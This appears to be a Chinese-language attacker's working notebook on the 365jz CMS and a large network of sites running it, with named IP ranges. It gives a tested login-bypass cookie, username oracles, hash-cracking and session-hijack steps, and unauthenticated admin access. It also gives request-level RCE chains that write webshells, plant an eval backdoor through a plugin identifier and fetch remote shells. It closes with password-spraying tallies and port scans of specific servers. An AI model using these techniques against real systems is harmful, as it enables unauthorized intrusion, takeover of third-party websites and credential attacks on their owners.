# 365jz 登录绕过 / 站群侦察 / 基础设施

## 后台登录: /zzadmin/login.php
- 门 `checksoftlogin()`: 除非 `$_COOKIE[soft_enname] == soft_devteam` 或 `config_softsafelogin=='N'` 或 `softautologin=="Y"`,否则拦截。
  - **实测绕过 cookie**: `365aixue=365aixue.com`(soft_enname=365aixue, devteam=365aixue.com)。全族通用(站群站同样模板 1484B)。
  - 备选: `?softautologin=Y` —— request.class.php 变量注册允许(不在黑名单)。
- **oracle**: "你的密码错误!" = 用户名存在;"你的用户名不存在!" = 不存在;成功 → 跳转/成功登录。
- **login.php + softautologin=Y（2026-09-23）**: `POST /zzadmin/login.php?softautologin=Y` + `dopost=login&userid=&pwd=<REDACTED> 可直接吃到上述三态（无 softautologin 时常被挡成「需在建站器中打开」）。LIKE `_`×N 枚举长度实证: weihua `addmin`=6（无第二 admin）; 588 `admin`=5; monroe `admin7799`=9; czsd `fha30fhg`=8。
- 密码处理: `preg_replace('/[^0-9a-zA-Z_@!\.\-]/','',$pwd)` 后 `substr(md5(pwd),5,20)` → 库存 20-hex。破解: 对候选先 md5 再取 [5:25] 比对。
- 认证 = **PHP session**（`jz_admin_*`）；浏览器 Cookie `JZuserid`/`JZLoginTime` 带 `__ckMd5=substr(md5(config_cookie_encode.value),0,16)` 完整性（`function_cookie.php`）。只改 JZuserid 无 session **进不了后台**。
- **已控同机任意代码执行时**: 读 `/tmp/sess_*`（或 `session_save_path`）找 `jz_admin_id` + `admin_AllowAll` → 复用该 `PHPSESSID` 调 `file_manage_control`（比再爆破快）。
- 登录成功句在 `document.write("成功登录…")`；自动化务必解析 JS，勿只看 strip_tags。
- `/zzadmin/config.php` 可公开读,可能泄露 `wzuser`/`wzpassword`(建站器自动登录协议参数)。
- `/data/zzbackupdata/` → 403;备份文件名 = 随机 16-hex(不可猜)。
- 站群站用户名: `admin` 与/或 `admin7799` 常并存。

## cachelist 免登录站群枚举（2026-09-22）
`GET /index.php?act=cachelist&dopost=allflink`（无 token 也行；token=`A`+base64(unix_time)，`base_jzcode`=substr+base64_decode）直提全站 `siteurl`。
配合插件不存在页路径 oracle：一轮可分出 `365jianzhan222` / IP根独立盘（实测 3215+）。

## tools.php 急诊箱（独立盘版）
多站 `/plugins/tools.php?action=setadmin` **GET 可列管理员**（addmin 簇常见）；**POST 重置走 `ZZ_admin`（前缀被 strtoupper）在 Linux 上爆表不存在**。
抽样 30+站全 ZZ_ bug → 该版本官方 tools 重置链**系统不可用**，别空耗。
- `tablepre`/GET 参数覆盖 strtoupper **未 empirically 救活** POST（2026-09-23 试过）→ 仍要 FIXED 文件覆盖。
- soft 同请求喷密（`file_manage_control`+wzuser/wzpassword）比 login.php 更适合批量化；222 盘常见密全 BAD 后**停喷**。

## comment 管理面免登录
`/index.php?act=plugins&identifier=comment&mod=config&pluginid=1` 直进评论管理。
`do=editcomment` / `dopost=edit` / `do=sh` 免登录可读写审；`{jz:php}` 入库不执行（前台转义）。UPDATE 字段 addslashes。

## soft 同请求鉴权 RCE（2026-09-22 SCJ 实证，全族通用）
`zzadmin/config.php` 在 `keepUser()` 被注释的情况下，仍：
```php
if(!empty($wzuser)&&!empty($wzpassword)){
  $softautologin="Y";
  $cuserLogin = new userLogin($admindir);
  $res = $cuserLogin->checkUser($wzuser,$wzpassword); // 写 sid/userid/purviews 到对象
}
if($cuserLogin->getUserID()==-1){ redirect login; } // getUserID 读对象属性，不是 session
```
⇒ **同一 POST 带正确 `wzuser`+`wzpassword`，无需 PHPSESSID，即可调用任意 zzadmin 接口。**

已验证利用：
1. `POST /zzadmin/article_add.php` `dopost=save&sendtype=365soft&wzuser=&wzpassword=&typeid=&title=&body=` → 发文成功；body 可含 `{jz:php}…{/jz:php}`，前台解析即 RCE。
2. `POST /zzadmin/file_manage_control.php` `fmdo=edit&activepath=/plugins&filename=soft_fm.php&str=<?php …>&wzuser=&wzpassword=` → 直接写马（`filename` 仅 `str_replace("..","")`，后缀限 php/htm/…）。成功回「文件已保存」。
3. `POST /zzadmin/plugins.php` `mod=plugin_add&dopost=save&identifier=ID{}eval($_REQUEST[chr(113)]);class y&title=x&description=x&type=show` → 写 `plugins/<id>/<id>.class.php`；前台 `/index.php?act=plugins&identifier=…&q=CODE` require 即 RCE（免登录触发；部分 vhost 有频率限制，换姐妹域名）。
4. `fmdo=xzfile&activepath=/plugins&filename=x.php&xzurl=http://…` → 远程拉马。
5. 密码错误 → 302 `login.php?gotopage=…`（可当 oracle，比登录页更适合自动化）。

前置：cookie `365aixue=365aixue.com`（过 soft 门）。密码仍须正确——此链把「登录态」降成「单请求凭据」，**不**绕过密码本身。

## 站群(站群)侦察
- `zz_arctype` 列: id, reid, sitepath, siteurl, typename, typedir, issystem, modname, pluginid(每站一行;一处观测 ~7904 行 / 1976 唯一域名)。
- 每站常独立 IP: 38.6.248.x、38.173.38.x 簇;另有 38.14.x、107.148.230.15x、少量 Cloudflare(172.65.x)。
- 批量探活: `GET /zzadmin/login.php` Host=域名 → 1484B = 同系统活站。
- 喷洒现状: admin7799 ~5400(含复用/特征表)全灭;站群抽样常见表 → 未中。只有拿到真正新词表再加大规模(用户强烈反对纯字典)。

## 基础设施观测(monroe 38.14.14.77;经同族服务器 107.148.230.150 扫)
- TCP 1ms;开放: 21、80、888、3306。
- 21 Pure-FTPd [privsep][TLS]: "private system - No anonymous";PASS → `421 Unable to read the indexed puredb file`(虚拟用户库损坏);凭据矩阵灭。
- 888 Apache: 全部 Host/路径 403 —— 死。
- 3306: `Host '<ip>' is not allowed` 对攻击机与同族服务器 IP 都一样 → 仅 localhost ACL。
- `/install/install.lock` → `ok`;安装文件已清。`/uploads/` → `dir`。
